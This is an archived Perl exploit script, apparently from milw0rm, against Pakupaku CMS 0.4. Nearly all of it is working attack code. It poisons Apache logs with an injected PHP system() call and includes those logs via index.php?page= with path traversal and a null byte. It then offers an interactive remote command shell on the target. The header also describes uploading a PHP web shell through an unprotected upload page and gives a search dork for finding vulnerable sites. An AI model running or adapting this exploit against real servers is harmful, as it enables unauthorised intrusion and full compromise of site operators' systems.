<html><head><title>Pakupaku CMS <= 0.4 Remote File Upload / LFI Vulnerability</title></head><pre>#!/usr/bin/perl
#########################################################################################
# Pakupaku CMS &lt;= 0.4 Remote File Upload Vulnerability                       
# 1- [Path_Script]/index.php?page=Uploads                                    
# 2- Upload GoLd-M.php &lt;= [Php Shell]                                        
# 3- [Path_Script]/uploads/GoLd-M.php &lt;= [Php Shell]                         
# D.Script :  http://heanet.dl.sourceforge.net/sourceforge/pakupaku/pakupaku-0.4.tar.gz  #
#########################################################################################
# D0RK  :http://www.google.com/search?client=opera&amp;rls=en&amp;q=Powered+by+Pakupaku+CMS&amp;sourceid=opera&amp;ie=utf-8&amp;oe=utf-8
# Pakupaku CMS 0.4 (Local Inclusion) Remote Command Execution Exploit

use IO::Socket;
use LWP::Simple;

#ripped from rgod
@apache=(
&quot;../../../../../var/log/httpd/access_log&quot;,
&quot;../../../../../var/log/httpd/error_log&quot;,
&quot;../apache/logs/error.log&quot;,
&quot;../apache/logs/access.log&quot;,
&quot;../../apache/logs/error.log&quot;,
&quot;../../apache/logs/access.log&quot;,
&quot;../../../apache/logs/error.log&quot;,
&quot;../../../apache/logs/access.log&quot;,
&quot;../../../../apache/logs/error.log&quot;,
&quot;../../../../apache/logs/access.log&quot;,
&quot;../../../../../apache/logs/error.log&quot;,
&quot;../../../../../apache/logs/access.log&quot;,
&quot;../logs/error.log&quot;,
&quot;../logs/access.log&quot;,
&quot;../../logs/error.log&quot;,
&quot;../../logs/access.log&quot;,
&quot;../../../logs/error.log&quot;,
&quot;../../../logs/access.log&quot;,
&quot;../../../../logs/error.log&quot;,
&quot;../../../../logs/access.log&quot;,
&quot;../../../../../logs/error.log&quot;,
&quot;../../../../../logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/access_log&quot;,
&quot;../../../../../etc/httpd/logs/access.log&quot;,
&quot;../../../../../etc/httpd/logs/error_log&quot;,
&quot;../../../../../etc/httpd/logs/error.log&quot;,
&quot;../../.. /../../var/www/logs/access_log&quot;,
&quot;../../../../../var/www/logs/access.log&quot;,
&quot;../../../../../usr/local/apache/logs/access_log&quot;,
&quot;../../../../../usr/local/apache/logs/access.log&quot;,
&quot;../../../../../var/log/apache/access_log&quot;,
&quot;../../../../../var/log/apache/access.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/www/logs/error_log&quot;,
&quot;../../../../../var/www/logs/error.log&quot;,
&quot;../../../../../usr/local/apache/logs/error_log&quot;,
&quot;../../../../../usr/local/apache/logs/error.log&quot;,
&quot;../../../../../var/log/apache/error_log&quot;,
&quot;../../../../../var/log/apache/error.log&quot;,
&quot;../../../../../var/log/access_log&quot;,
&quot;../../../../../var/log/error_log&quot;
);

print &quot; ########################################################################\n&quot;;
print &quot; # Pakupaku CMS 0.4 (Local Inclusion) Remote Command Execution Exploit  #\n&quot;;
print &quot; # Discovered by: GoLd_M = [Mahmood_ali]                                #\n&quot;;
print &quot; # Thanx To : Tryag-Team &amp; Asbmay's Group &amp; bd0rk &amp; All My Friends      #\n&quot;;
print &quot; ########################################################################\n\n&quot;;

if (@ARGV &lt; 3)
{

      print &quot; ########################################################################\n&quot;;
      print &quot; # Usage: 3xp|017.pl [site] [Path] [apache_path]                        #\n&quot;;
      print &quot; # Apache Path:                                                         #\n&quot;;
      print &quot; ########################################################################\n&quot;;
    $i = 0;
    while($apache[$i])
    { print &quot;[$i] $apache[$i]\n&quot;;$i++;}
    exit();
}

$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];

print &quot;[RST] Injecting some code in log files...\n&quot;;
$CODE=&quot;&lt;?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?&gt;&quot;;
$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;[RST] Could not connect to host.\n\n&quot;;
print $socket &quot;GET &quot;.$path.$CODE.&quot; HTTP/1.1\r\n&quot;;
print $socket &quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
close($socket);
print &quot;[RST] Shell!! write q to exit !\n&quot;;
print &quot;[RST] IF not working try another apache path\n\n&quot;;

print &quot;[shell] &quot;;$cmd = &lt;STDIN&gt;;

while($cmd !~ &quot;q&quot;) {
    $socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;[RST] Could not connect to host.\n\n&quot;;

    print $socket &quot;GET &quot;.$path.&quot;index.php?page=&quot;.$apache[$apachepath].&quot;%00&amp;cmd=$cmd HTTP/1.1\r\n&quot;;
    print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
    print $socket &quot;Accept: */*\r\n&quot;;
    print $socket &quot;Connection: close\r\n\n&quot;;

    while ($raspuns = &lt;$socket&gt;)
    {
        print $raspuns;
    }

    print &quot;[shell] &quot;;
    $cmd = &lt;STDIN&gt;;
}

# milw0rm.com [2007-08-29]</pre></html>